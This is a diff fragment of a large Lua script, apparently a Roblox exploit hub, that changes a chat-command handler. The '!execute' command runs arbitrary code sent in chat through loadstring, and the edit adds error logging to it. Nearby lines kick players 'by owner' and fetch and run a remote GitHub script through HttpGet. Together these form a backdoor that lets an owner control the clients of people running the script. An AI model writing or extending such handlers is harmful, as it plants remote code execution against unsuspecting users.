@@ -29962,9 +29962,16 @@ do
                 lp:Kick("Kicked by owner")
 
             elseif cmd == "!execute" then
-                local code = msg:sub(10)
-                local fn, err = loadstring(code)
-                if fn then pcall(fn) end
+    local code = msg:sub(10)
+    local fn, err = loadstring(code)
+    if fn then
+        local ok, runtimeErr = pcall(fn)
+        if not ok then
+            warn("EXECUTE ERROR: " .. tostring(runtimeErr))
+        end
+    else
+        warn("LOAD ERROR: " .. tostring(err))
+end
 
             elseif cmd == "!xen" then
                 local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
